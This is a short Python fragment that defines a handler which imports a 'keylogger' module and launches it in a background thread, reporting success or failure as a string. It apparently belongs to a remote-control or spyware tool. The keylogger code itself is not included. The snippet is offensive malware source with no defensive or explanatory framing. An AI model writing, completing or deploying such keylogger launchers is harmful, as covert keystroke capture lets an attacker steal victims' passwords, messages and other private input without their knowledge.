import threading
import keylogger

def handle_keylogger(_):
    try:
        t = threading.Thread(target=keylogger.main)
        t.start()
        return "Started keylogger thread"
    except Exception as e: return f"Error starting keylogger thread: {e}"
